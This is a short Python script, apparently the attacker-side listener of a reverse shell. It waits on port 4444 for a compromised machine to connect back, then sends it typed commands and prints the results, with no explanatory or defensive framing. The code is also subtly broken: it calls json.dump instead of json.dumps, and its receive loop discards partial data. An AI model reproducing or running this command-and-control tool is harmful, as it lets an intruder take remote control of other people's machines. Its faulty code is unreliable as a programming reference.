import socket, json

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Wailting Connection")
        self.connection, address = listener.accept()
        print("[+] Connection Successful from " + str(address))
    
    def safe_send(self, data):
        self.connection.send(json.dump(data))
    
    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode("UTF-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_commands(self, command):
        self.safe_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.safe_receive()
    
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            command_result = self.execute_commands(command)
            print(command_result)

my_listener = Listener("192.168.1.5", 4444)
my_listener.run()